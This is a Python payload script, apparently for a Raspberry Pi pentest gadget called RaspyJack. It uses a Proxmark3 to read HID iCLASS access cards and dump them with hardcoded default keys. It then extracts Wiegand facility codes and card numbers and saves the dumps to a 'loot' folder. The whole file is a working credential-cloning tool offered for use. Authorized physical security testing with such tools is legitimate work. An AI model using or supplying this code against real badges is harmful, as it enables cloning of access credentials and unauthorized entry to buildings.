#!/usr/bin/env python3
"""
RaspyJack Payload -- PM3 iCLASS
==================================
Read and dump HID iCLASS/PicoPass cards using Proxmark3.
Extracts CSN, config, credential blocks, and Wiegand data.

Controls:
  OK         Read card
  UP/DOWN    Scroll blocks
  KEY1       Full dump (with default keys)
  KEY2       Save dump
  KEY3       Exit
"""

import os
import sys
import re
import json
import time
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads.nfc_rfid._nfc_driver import auto_detect, PM3Driver

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
LOOT_DIR = "/root/Raspyjack/loot/NFC/iclass"
DEBOUNCE = 0.18
_last_btn = 0

ICLASS_KEYS = [
    "AFA785A7DAB33E",
    "76B809A550C0FF",
    "F0E1D2C3B4A596",
    "1122334455667788",
]


def _btn():
    global _last_btn
    b = get_button(PINS, GPIO)
    now = time.time()
    if b and now - _last_btn < DEBOUNCE:
        return None
    if b:
        _last_btn = now
    return b


def _parse_reader(out):
    """Parse 'hf iclass reader' output for CSN, CC, and card type."""
    if not out:
        return None
    csn = None
    cc = None
    card_type = "iCLASS"

    m = re.search(r"CSN\s*[:=]\s*([0-9A-Fa-f ]+)", out, re.IGNORECASE)
    if m:
        csn = m.group(1).strip().replace(" ", "")

    m = re.search(r"CC\s*[:=]\s*([0-9A-Fa-f ]+)", out, re.IGNORECASE)
    if m:
        cc = m.group(1).strip().replace(" ", "")

    if not csn:
        m = re.search(r"([0-9A-Fa-f]{16})", out)
        if m and "iclass" in out.lower():
            csn = m.group(1)

    if not csn:
        return None

    lower = out.lower()
    if "se" in lower and "seos" not in lower:
        card_type = "iCLASS SE"
    elif "seos" in lower:
        card_type = "iCLASS SEOS"
    elif "legacy" in lower:
        card_type = "iCLASS Legacy"
    elif "picopass" in lower:
        card_type = "PicoPass"

    return {"csn": csn.upper(), "cc": cc.upper() if cc else "", "type": card_type}


def _parse_dump(out):
    """Parse 'hf iclass dump' output for block data."""
    blocks = {}
    if not out:
        return blocks
    for m in re.finditer(
        r"(?:block|blk)\s*(\d+)\s*[:=\|]\s*([0-9A-Fa-f ]+)", out, re.IGNORECASE
    ):
        blk_num = int(m.group(1))
        blk_data = m.group(2).strip().replace(" ", "").upper()
        if len(blk_data) >= 16:
            blocks[blk_num] = blk_data[:16]
    if not blocks:
        for m in re.finditer(
            r"\|\s*(\d+)\s*\|\s*([0-9A-Fa-f ]{23,})\s*\|", out
        ):
            blk_num = int(m.group(1))
            blk_data = m.group(2).strip().replace(" ", "").upper()
            if len(blk_data) >= 16:
                blocks[blk_num] = blk_data[:16]
    return blocks


def _parse_wiegand(blocks):
    """Try to extract Wiegand facility code and card number from app blocks."""
    for blk_num in [7, 6, 8, 9]:
        data = blocks.get(blk_num, "")
        if not data or data == "0" * 16:
            continue
        raw = int(data, 16)
        bits = bin(raw)[2:].zfill(64)
        for offset in range(0, 40):
            chunk = bits[offset:offset + 26]
            if len(chunk) < 26:
                break
            fc = int(chunk[1:9], 2)
            cn = int(chunk[9:25], 2)
            if 0 < fc < 256 and 0 < cn < 65536:
                return {"format": "H10301", "facility": fc, "card": cn}
        for offset in range(0, 30):
            chunk = bits[offset:offset + 35]
            if len(chunk) < 35:
                break
            fc = int(chunk[2:14], 2)
            cn = int(chunk[14:34], 2)
            if 0 < fc < 4096 and 0 < cn < 1048576:
                return {"format": "C1k35s", "facility": fc, "card": cn}
    return None


def main():
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()

    font = scaled_font(10)
    font_sm = scaled_font(9)
    font_xs = scaled_font(9)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Detecting reader...", font=font_sm, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    drv, drv_desc = auto_detect()
    status = drv_desc if drv else "No reader"
    card_info = None
    blocks = {}
    wiegand = None
    scroll = 0

    if drv and not isinstance(drv, PM3Driver):
        status = "Need Proxmark3!"

    try:
        while True:
            btn = _btn()
            if btn == "KEY3":
                break

            if btn == "UP":
                scroll = max(0, scroll - 1)
            elif btn == "DOWN":
                scroll += 1

            if btn == "OK" and isinstance(drv, PM3Driver):
                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.rectangle((0, 0, 127, 14), fill="#111")
                d.text((2, 2), "iCLASS", font=font_sm, fill="#00CCFF")
                d.text((4, 50), "Place card...", font=font_sm, fill="#FFAA00")
                lcd.LCD_ShowImage(img, 0, 0)

                out = drv.command("hf iclass reader", timeout=8.0)
                card_info = _parse_reader(out)
                if card_info:
                    status = card_info["type"]
                    blocks = {}
                    wiegand = None
                    scroll = 0
                else:
                    status = "No iCLASS card"
                    card_info = None

            if btn == "KEY1" and isinstance(drv, PM3Driver) and card_info:
                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.rectangle((0, 0, 127, 14), fill="#111")
                d.text((2, 2), "DUMPING", font=font_sm, fill="#FF4444")
                d.text((4, 30), f"CSN: {card_info['csn'][:12]}", font=font_sm, fill="#ccc")
                d.text((4, 50), "Trying default keys...", font=font_sm, fill="#FFAA00")
                lcd.LCD_ShowImage(img, 0, 0)

                out = drv.command("hf iclass dump --ki 0", timeout=15.0)
                blocks = _parse_dump(out)
                if not blocks:
                    for key in ICLASS_KEYS:
                        out = drv.command(f"hf iclass dump -k {key}", timeout=15.0)
                        blocks = _parse_dump(out)
                        if blocks:
                            break

                wiegand = _parse_wiegand(blocks) if blocks else None
                if blocks:
                    status = f"Dumped {len(blocks)} blocks"
                else:
                    status = "Dump failed (keys?)"

            if btn == "KEY2" and card_info:
                os.makedirs(LOOT_DIR, exist_ok=True)
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                csn_short = card_info["csn"][:8]
                fname = f"iclass_{csn_short}_{ts}.json"
                dump = {
                    "csn": card_info["csn"],
                    "cc": card_info.get("cc", ""),
                    "type": card_info["type"],
                    "timestamp": ts,
                    "blocks": blocks,
                }
                if wiegand:
                    dump["wiegand"] = wiegand
                with open(os.path.join(LOOT_DIR, fname), "w") as f:
                    json.dump(dump, f, indent=2)
                status = f"Saved: {fname[:16]}"

            # --- Draw ---
            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
            d = ScaledDraw(img)
            d.rectangle((0, 0, 127, 14), fill="#111")
            d.text((2, 2), "iCLASS", font=font_sm, fill="#00CCFF")
            d.text((80, 2), drv_desc[:6] if drv else "NONE", font=font_xs,
                   fill="#00FF00" if isinstance(drv, PM3Driver) else "#FF4444")

            y = 18
            d.text((2, y), status[:24], font=font_sm, fill="#FFAA00")
            y += 13

            if card_info:
                d.text((2, y), f"CSN: {card_info['csn']}", font=font_sm, fill="#00FF00")
                y += 11
                d.text((2, y), f"Type: {card_info['type']}", font=font_sm, fill="#ccc")
                y += 11
                if card_info.get("cc"):
                    d.text((2, y), f"CC: {card_info['cc']}", font=font_xs, fill="#888")
                    y += 11

                if wiegand:
                    d.text((2, y), f"FC:{wiegand['facility']} CN:{wiegand['card']}", font=font, fill="#FF00FF")
                    y += 14
                    d.text((2, y), f"Format: {wiegand['format']}", font=font_xs, fill="#888")
                    y += 11

                if blocks:
                    d.text((2, y), f"Blocks: {len(blocks)}", font=font_sm, fill="#ccc")
                    y += 12
                    sorted_blks = sorted(blocks.items())
                    for i in range(scroll, min(len(sorted_blks), scroll + 4)):
                        if y > 108:
                            break
                        bnum, bdata = sorted_blks[i]
                        d.text((2, y), f"B{bnum:02d} {bdata}", font=font_xs, fill="#aaa")
                        y += 10
            else:
                d.text((4, 55), "Press OK to scan", font=font_sm, fill="#666")
                if not isinstance(drv, PM3Driver):
                    d.text((4, 72), "Requires Proxmark3", font=font_sm, fill="#FF4444")

            d.rectangle((0, 116, 127, 127), fill="#111")
            d.text((2, 117), "OK:Read K1:Dump K2:Save", font=font_xs, fill="#666")
            lcd.LCD_ShowImage(img, 0, 0)

            time.sleep(0.03)

    finally:
        if drv:
            drv.close()
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
